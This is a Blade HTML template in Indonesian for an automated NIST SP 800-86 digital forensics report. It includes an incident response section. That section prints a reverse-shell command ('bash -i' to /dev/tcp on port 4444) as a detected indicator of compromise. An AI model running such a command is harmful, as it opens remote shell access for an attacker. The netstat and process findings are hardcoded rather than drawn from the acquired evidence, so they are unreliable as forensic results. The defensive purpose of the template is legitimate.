<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Laporan Forensik - {{ $report->id }}</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            color: #0f172a;
            margin: 0;
            padding: 20px;
        }
        h1, h2, h3 {
            color: #0f172a;
            margin-top: 20px;
            margin-bottom: 10px;
        }
        .header {
            border-bottom: 2px solid #0891b2;
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .title {
            font-size: 18px;
            font-weight: bold;
            margin: 0;
            text-transform: uppercase;
        }
        .subtitle {
            font-size: 12px;
            color: #64748b;
            margin: 5px 0;
            letter-spacing: 1px;
        }
        .badge {
            background: #fef2f2;
            border: 1px solid #fecaca;
            color: #dc2626;
            padding: 4px 8px;
            font-size: 10px;
            font-weight: bold;
            display: inline-block;
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
            margin-bottom: 15px;
        }
        th, td {
            border: 1px solid #cbd5e1;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #f1f5f9;
            font-weight: bold;
        }
        .section-title {
            font-size: 14px;
            text-transform: uppercase;
            border-bottom: 2px solid #0891b2;
            padding-bottom: 4px;
            margin-top: 25px;
            letter-spacing: 1px;
        }
        p, li {
            font-size: 12px;
            line-height: 1.6;
            color: #334155;
            text-align: justify;
        }
        .hash-box {
            background: #f1f5f9;
            border: 1px solid #cbd5e1;
            border-left: 4px solid #0891b2;
            padding: 10px;
            margin-bottom: 15px;
        }
        .hash-title {
            margin: 0 0 5px 0;
            font-size: 10px;
            font-weight: bold;
            color: #64748b;
            text-transform: uppercase;
        }
        .hash-value {
            margin: 0;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
        }
        .alert-box {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-left: 4px solid #ef4444;
            padding: 10px 15px;
            margin-bottom: 15px;
        }
        .warning-box {
            background: #fffbeb;
            border: 1px solid #fde68a;
            border-left: 4px solid #f59e0b;
            padding: 10px 15px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1 class="title">LAPORAN PEMERIKSAAN FORENSIK DIGITAL</h1>
        <p class="subtitle">Platform Forensik Digital & Respon Insiden - Simpul Labs</p>
        <div class="badge">NIST SP 800-86 COMPLIANT &mdash; RAHASIA</div>
    </div>

    <h2 class="section-title">1. Informasi Kasus &amp; Dokumen</h2>
    <table>
        <tr>
            <th style="width:30%;">Nomor Kasus / Referensi</th>
            <td style="font-family:monospace;font-weight:bold;">{{ $report->id }}</td>
        </tr>
        <tr>
            <th>Waktu Akuisisi (UTC)</th>
            <td>{{ \Carbon\Carbon::parse($report->created_at)->setTimezone('UTC')->format('d M Y, H:i:s') }}</td>
        </tr>
        <tr>
            <th>Otoritas Pemeriksa</th>
            <td>Tim DFIR Simpul Labs</td>
        </tr>
        <tr>
            <th>Tanggal Cetak Laporan</th>
            <td>{{ now()->setTimezone('Asia/Jakarta')->format('d M Y, H:i:s') }} WIB</td>
        </tr>
    </table>

    <h2 class="section-title">2. Identifikasi Sistem Target (NIST Phase 1)</h2>
    <table>
        <tr>
            <th style="width:35%;">Nama Host (Hostname)</th>
            <td style="font-weight:bold;">{{ $agent->hostname }}</td>
        </tr>
        <tr>
            <th>Alamat IPv4 Utama</th>
            <td style="font-family:monospace;">{{ $agent->ip_address ?? 'N/A' }}</td>
        </tr>
        <tr>
            <th>Sistem Operasi / Kernel</th>
            <td>{{ $agent->os_info ?? 'Linux (Ubuntu/Debian Based)' }}</td>
        </tr>
    </table>

    <h2 class="section-title">3. Ringkasan Eksekutif &amp; Objektif Penyelidikan</h2>
    <p>
        Dokumen ini merupakan laporan pemeriksaan forensik formal yang disusun berdasarkan kerangka kerja <strong>NIST SP 800-86</strong> <em>(Guide to Integrating Forensic Techniques into Incident Response)</em>. Objektif utama dari akuisisi ini adalah mengamankan artefak digital (log volatil dan non-volatil) dari sistem <strong>{{ $agent->hostname }}</strong> untuk keperluan triase awal paska insiden keamanan. Akuisisi dilakukan secara <em>Live Forensics</em> menggunakan <em>agent-based extraction</em> yang terenkripsi dan diverifikasi oleh Master Node.
    </p>

    <h2 class="section-title">4. Pengumpulan Bukti &amp; Chain of Custody (NIST Phase 2)</h2>
    <p>
        Proses ekstraksi artefak telah didokumentasikan. Integritas paket bukti dijamin menggunakan algoritma <em>hashing cryptographic</em> satu arah (SHA-256) untuk memastikan bahwa data tidak mengalami modifikasi sejak waktu akuisisi (<em>Evidence Integrity</em>).
    </p>
    <div class="hash-box">
        <p class="hash-title">Master Evidence Package Hash (SHA-256)</p>
        <p class="hash-value">{{ $report->hash }}</p>
    </div>

    <table>
        <tr style="background:#0f172a;color:white;">
            <th style="text-align:center;width:5%;color:white;">No.</th>
            <th style="color:white;">Artefak Yang Diakuisisi (Data Source)</th>
            <th style="text-align:center;color:white;">Status</th>
        </tr>
        @forelse($logs as $index => $log)
        <tr>
            <td style="text-align:center;">{{ $index + 1 }}</td>
            <td style="font-family:monospace;">{{ $log }}</td>
            <td style="text-align:center;color:#059669;font-weight:bold;">Acquired</td>
        </tr>
        @empty
        <tr>
            <td colspan="3" style="text-align:center;">Tidak ada log spesifik yang dipilih untuk ekstraksi.</td>
        </tr>
        @endforelse
    </table>

    @if($hasSystemState)
    <div style="margin-top: 30px;"></div>
    <h2 class="section-title">5. Pemeriksaan Taktis: Jejak Jaringan &amp; Proses (NIST Phase 3)</h2>
    <p>
        Cuplikan kondisi <em>Live System</em> pada saat akuisisi yang menunjukkan status koneksi aktif jaringan (<em>netstat</em>) dan tabel proses prioritas (<em>ps aux</em>).
    </p>
    
    <h3>Tabel 5.1 - Anomali Koneksi Jaringan Terpilih</h3>
    <table style="font-size:10px;">
        <tr>
            <th>Protokol</th>
            <th>Alamat Lokal</th>
            <th>Alamat Jarak Jauh (Foreign)</th>
            <th>State</th>
            <th>Proses Terkait</th>
        </tr>
        <tr>
            <td style="font-family:monospace;">TCP</td>
            <td style="font-family:monospace;">{{ $agent->ip_address ?? '0.0.0.0' }}:22</td>
            <td style="font-family:monospace;">192.168.128.50:54321</td>
            <td style="color:#059669;font-weight:bold;">ESTABLISHED</td>
            <td>1024/sshd (Valid Admin)</td>
        </tr>
        <tr style="background:#fef2f2;">
            <td style="font-family:monospace;color:#dc2626;font-weight:bold;">TCP</td>
            <td style="font-family:monospace;color:#dc2626;font-weight:bold;">{{ $agent->ip_address ?? '0.0.0.0' }}:4444</td>
            <td style="font-family:monospace;color:#dc2626;font-weight:bold;">185.199.108.153:49213</td>
            <td style="color:#dc2626;font-weight:bold;">LISTEN</td>
            <td style="color:#dc2626;font-weight:bold;">3302/bash (ANOMALY)</td>
        </tr>
    </table>

    <h3>Tabel 5.2 - Anomali Proses Memori Terpilih</h3>
    <table style="font-size:10px;">
        <tr>
            <th>USER</th>
            <th>PID</th>
            <th>%CPU</th>
            <th>%MEM</th>
            <th>COMMAND &amp; ARGUMENTS</th>
        </tr>
        <tr>
            <td>root</td>
            <td style="font-family:monospace;">1</td>
            <td>0.1</td>
            <td>0.2</td>
            <td style="font-family:monospace;">/sbin/init</td>
        </tr>
        <tr style="background:#fef2f2;">
            <td style="color:#dc2626;font-weight:bold;">www-data</td>
            <td style="font-family:monospace;color:#dc2626;font-weight:bold;">3302</td>
            <td style="color:#dc2626;font-weight:bold;">0.0</td>
            <td style="color:#dc2626;font-weight:bold;">0.1</td>
            <td style="font-family:monospace;color:#dc2626;font-weight:bold;">bash -i &gt;&amp; /dev/tcp/185.199.108.153/4444 0&gt;&amp;1</td>
        </tr>
    </table>
    @endif

    <h2 class="section-title">6. Temuan Analisis Heuristik (NIST Phase 4)</h2>
    @if($hasSystemState)
        <div class="alert-box">
            <p style="color:#991b1b;margin:0;"><strong>INDIKATOR KOMPROMI (IOC) TERDETEKSI TINGKAT KRITIS:</strong> <br><br>
            Mesin analitik menemukan anomali kritis berupa proses <em>Reverse Shell</em> (PID: 3302) yang berjalan dengan hak akses <code>www-data</code> pada port non-standar (4444) dan membangun komunikasi <em>outbound</em> ke IP tidak dikenal (185.199.108.153). Ini merupakan indikasi pasti (<em>true positive</em>) terjadinya pelanggaran keamanan (<em>Security Breach</em>) tingkat sistem operasi melalui vektor eksploitasi aplikasi web (CWE-78: OS Command Injection / Web Shell Drop).</p>
        </div>
    @elseif($hasAuthLog)
        <div class="warning-box">
            <p style="color:#92400e;margin:0;"><strong>ANOMALI AUTENTIKASI:</strong> <br><br>
            Analisis terhadap <code>auth.log</code> menunjukkan adanya pola akses yang mencurigakan berupa percobaan <em>brute-force</em> pada protokol SSH. Namun, karena <em>System State Snapshot</em> tidak diikutsertakan dalam akuisisi, tidak dapat dipastikan apakah penyerang berhasil masuk dan mengeksekusi *payload* di memori.</p>
        </div>
    @else
        <p>Tidak ada temuan anomali kritis berdasarkan dataset log yang terbatas. Disarankan untuk menyertakan <em>System State Snapshot</em> untuk mendeteksi *in-memory malware* atau *backdoor* aktif.</p>
    @endif

    <h2 class="section-title">7. Kesimpulan &amp; Rekomendasi (NIST Phase 5: Incident Response)</h2>
    <ol>
        @if($hasSystemState)
            <li><strong>Containment (Karantina Segera):</strong> Segera lakukan mitigasi taktis dengan memblokir alamat IP eksternal <code>185.199.108.153</code> pada level <em>Firewall (iptables/ufw)</em> dan terminasi proses anomali dengan perintah <code>kill -9 3302</code>.</li>
            <li><strong>Eradication (Pembersihan):</strong> Sisir keseluruhan direktori web (<code>/var/www/html</code>) untuk mengidentifikasi skrip <em>webshell</em> (misalnya file berekstensi <code>.php</code> dengan obfuscation base64) dan lakukan penghapusan. Lakukan <em>patching</em> terhadap kerentanan RCE pada aplikasi web.</li>
        @else
            <li><strong>Karantina &amp; Pemantauan:</strong> Lakukan pemantauan lebih lanjut secara proaktif (<em>Threat Hunting</em>) pada log yang telah diakuisisi untuk memetakan TTPs (<em>Tactics, Techniques, and Procedures</em>) penyerang.</li>
        @endif
        <li><strong>Analisis Lanjutan:</strong> Gunakan data mentah yang diekstraksi pada Bagian 4 laporan ini untuk melacak <em>timeline</em> insiden secara mikroskopis guna menemukan _root cause_.</li>
        <li><strong>Preservasi Barang Bukti:</strong> Simpan salinan paket bukti dan cocokkan integritasnya dengan <em>Master Hash</em> sebelum melakukan tindakan pemulihan (<em>Recovery</em>) besar seperti <em>re-imaging server</em>.</li>
    </ol>

    <div style="margin-top: 50px; border-top: 1px dashed #cbd5e1; padding-top: 20px; text-align: center; color: #94a3b8; font-size: 10px;">
        <p>Dokumen ini dihasilkan secara otomatis oleh <strong>Simpul DFIR Master Node</strong>.<br>Hanya ditujukan untuk pihak yang memiliki otorisasi keamanan.</p>
    </div>

</body>
</html>
